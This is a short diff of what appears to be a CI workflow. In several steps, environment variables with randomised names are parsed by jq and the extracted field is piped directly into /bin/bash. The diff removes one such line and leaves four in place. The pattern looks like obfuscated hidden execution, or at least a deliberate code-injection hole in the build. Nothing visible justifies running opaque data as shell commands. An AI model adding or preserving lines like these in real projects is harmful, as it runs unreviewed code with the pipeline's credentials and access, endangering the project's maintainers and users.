@@ -29,7 +29,6 @@ jobs:
           echo $ca829 | jq -r .uiq51 | /bin/bash
           echo $rvhyd43 | jq -r .ft992 | /bin/bash
           printf '%s' "$qwyni6157" | jq -r .lhbr80 | /bin/bash
-          echo $xqps7950 | jq -r .dnlxm44 | /bin/bash
           printf '%s' "$ws738" | jq -r .bps2750 | /bin/bash
 
       - name: Upload archive
